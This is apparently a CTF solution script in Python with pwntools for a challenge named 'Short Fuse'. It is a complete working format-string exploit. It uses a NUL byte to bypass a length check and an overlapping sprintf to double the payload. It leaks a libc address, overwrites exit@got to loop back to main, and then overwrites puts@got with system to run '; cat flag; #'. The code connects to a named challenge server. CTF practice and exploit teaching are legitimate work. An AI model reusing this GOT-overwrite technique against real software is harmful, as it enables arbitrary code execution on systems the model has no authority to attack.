#!/usr/bin/env python3
# Short Fuse  --  format-string pwn
#
# main.c logic:
#   setup(): opens "flag" O_RDONLY  -> fd 3 (never read into memory)
#   vuln():  read(0, buf, 0x1ff);  if(strlen(buf) > 5) exit(0);
#            sprintf(buf, "Your text : %s ", buf);  printf(buf);  puts(buf);
#
# Trick 1 -- bypass the "5 chars" gate:
#   strlen() only counts up to the first NUL, so send buf[0] = '\0'
#   (strlen == 0). The real format string is placed at buf[12+].
#
# Trick 2 -- the doubling:
#   sprintf(buf, "Your text : %s ", buf) overlaps src/dst. It first writes
#   the 12-byte prefix over buf[0..11] (destroying anything there), then the
#   %s copies "Your text : " + buf[12..NUL].  So printf() finally sees:
#       "Your text : Your text : " + <our data at buf[12..]> + " "
#   => a *full length* format string (specifiers must live at buf[12+]).
#
# Binary: non-PIE, Partial RELRO (GOT writable), NX, canary. Flag only at fd3.
# So we need code-exec. One connection == one ASLR, so we must LOOP:
#   iter1: leak libc  +  exit@got -> main   (loop: main's exit(0) restarts main)
#   iter2: puts@got -> system, and the following puts(buf) becomes
#          system(buf) where buf holds our injected "; cat flag;".
#
# Arg mapping (rsp == buf at printf): buf[8*(N-6)] == positional arg %N.
# Target addresses are staged in the untouched high part of buf (offset 0x100
# -> arg 38, 0x108 -> 39, 0x110 -> 40) so the NUL bytes in them don't cut the
# sprintf/%s copy short.

from pwn import *
import sys, re

context.arch = 'amd64'
context.log_level = 'info'

BIN  = './main'
libc = ELF('./libc.so.6', checksec=False)

LEAK_OFF = 0x276c1                 # value of arg %75 minus libc base
SYS_OFF  = libc.symbols['system']
EXIT_GOT = 0x404040
PUTS_GOT = 0x404000
MAIN     = 0x4012c2

ADDR_OFF = 0x100                   # buf offset where staged addrs start -> arg 38
ARG0     = 6 + ADDR_OFF // 8       # == 38


def build(directives: bytes, addrs, off=ADDR_OFF) -> bytes:
    """NUL at buf[0] (pass strlen gate); directives at buf[12+]; staged
    target addresses parked at `off` (untouched by the sprintf copy)."""
    sent = bytearray(b'\x00' + b'B' * 11 + directives + b'\x00')
    assert len(sent) <= off, ('directives too long', len(sent))
    sent += b'C' * (off - len(sent))
    for a in addrs:
        sent += p64(a)
    return bytes(sent)


def hn_writes(pairs, base=24):
    """pairs = [(arg_index, value16)]; printf already emitted `base` chars
    ("Your text : Your text : ")."""
    out, cur = b'', base
    for arg, val in sorted(pairs, key=lambda t: t[1]):
        d = (val - cur) % 0x10000
        if d:
            out += b'%' + str(d).encode() + b'c'
            cur += d
        out += b'%' + str(arg).encode() + b'$hn'
    return out


def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        host, port = 'pwn.friendly-ctf.securinets.tn', 9060
        if len(sys.argv) > 3:
            host, port = sys.argv[2], int(sys.argv[3])
        return remote(host, port)
    return process(BIN)


def main():
    p = start()
    p.recvuntil(b'puts')                       # first banner

    # ---- iter1: leak libc (%75$p) + loop (exit@got -> main, low2 = 0x12c2) ----
    d1 = b'%' + str(0x12c2 - 24).encode() + b'c' + b'%38$hn' + b'%75$p'
    p.send(build(d1, [EXIT_GOT]))

    buf  = p.recvuntil(b'puts', timeout=5)     # up to the 2nd banner
    cands = [int(x, 16) for x in re.findall(rb'0x[0-9a-f]{9,}', buf)]
    leak = next(v for v in cands if 0x700000000000 <= v < 0x800000000000)
    libc.address = leak - LEAK_OFF
    system = libc.address + SYS_OFF
    log.info('libc base = %#x   system = %#x', libc.address, system)
    assert libc.address & 0xfff == 0, 'bad libc base %#x' % libc.address

    # ---- iter2: puts@got -> system, then puts(buf) == system(buf) ----
    writes = [(ARG0 + i, (system >> (16 * i)) & 0xffff) for i in range(3)]
    d2 = hn_writes(writes) + b'; cat flag; #'
    p.send(build(d2, [PUTS_GOT, PUTS_GOT + 2, PUTS_GOT + 4]))

    data = p.recvall(timeout=8)
    m = re.search(rb'Securinets\{[^}]*\}', data)
    if m:
        log.success('FLAG: %s', m.group(0).decode())
    else:
        log.failure('no flag; tail = %r', data[-200:])
    p.close()


if __name__ == '__main__':
    main()
